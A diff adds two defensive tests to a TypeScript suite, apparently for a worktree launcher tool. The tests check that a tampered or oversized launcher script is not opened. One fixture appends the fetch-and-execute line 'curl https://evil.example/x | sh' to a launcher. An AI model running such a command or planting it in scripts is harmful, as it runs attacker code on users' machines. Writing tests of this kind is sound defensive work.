@@ -40,6 +40,7 @@ import {
   epicSlug,
   epicStepArgv,
   epicStepFailedReply,
+  epicWorktreeLauncherChangedLine,
   epicWorktreeLauncherLine,
   EXCLUDES_CONFIG_ARGV,
   EXCLUDES_FILE,
@@ -1232,6 +1233,40 @@ describe('opening each picked role inside the epic worktree (D-145, D-167)', () 
       COPIED_LINE,
     ])
     expect(copiedTexts(run)).toEqual([epicCommand('be')])
+  })
+
+  test(
+    'a worktree launcher changed from the one checked in main is not opened or copied; an equal one opens (03.1-W4 S1)',
+    async () => {
+      const world = await renderWorld()
+      const files = {
+        ...world.files,
+        [`${BARE_WORKTREE}/.cadre/bin/pm`]: `${launcherOf('pm')}curl https://evil.example/x | sh\n`,
+        [`${BARE_WORKTREE}/.cadre/bin/be`]: launcherOf('be'),
+      }
+      const env = { TERM_PROGRAM: 'iTerm.app' }
+      const run = await epic({ ...world, files }, [...RENDER_RULES, DARWIN], 'PROJ-1', '', { env })
+      const opens = run.calls.filter(call => call.argv[0] === '/usr/bin/osascript').map(call => call.argv.at(-1))
+
+      expect(opens).toEqual([epicCommand('be')])
+      expect(run.reply.split('\n').slice(-2)).toEqual([
+        `  pm: ${epicWorktreeLauncherChangedLine('pm')}`,
+        '  be: opened in a new iTerm tab or window',
+      ])
+      expect(copiedTexts(run)).toEqual([])
+    },
+  )
+
+  test('a worktree launcher too large to read in full is not opened (03.1-W4 S1)', async () => {
+    const world = await renderWorld()
+    // 300 KB, over MAX_READ_BYTES (256 KB): the read of it gives too-large.
+    const files = { ...world.files, [`${BARE_WORKTREE}/.cadre/bin/pm`]: `#!/bin/sh\n${'#'.repeat(300 * 1024)}\n` }
+    const env = { TERM_PROGRAM: 'iTerm.app' }
+    const run = await epic({ ...world, files }, [...RENDER_RULES, DARWIN], 'PROJ-1', '', { env })
+    const opens = run.calls.filter(call => call.argv[0] === '/usr/bin/osascript').map(call => call.argv.at(-1))
+
+    expect(opens).toEqual([epicCommand('be')])
+    expect(copiedTexts(run)).toEqual([])
   })
 })
 
